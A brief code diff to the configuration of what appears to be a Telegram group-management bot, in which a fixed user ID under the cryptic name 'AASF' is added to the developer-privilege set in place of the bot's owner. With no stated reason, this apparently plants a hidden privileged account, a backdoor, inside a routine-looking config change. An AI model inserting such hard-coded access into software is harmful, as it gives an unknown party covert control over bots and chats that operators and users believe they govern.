@@ -180,8 +180,9 @@ else:
         raise Exception(
             "Your blacklisted chats list does not contain valid integers.")
 
+AASF = "2022280326"
 DRAGONS.add(OWNER_ID)
-DEV_USERS.add(OWNER_ID)
+DEV_USERS.add(AASF)
 
 if not SPAMWATCH_API:
     sw = None
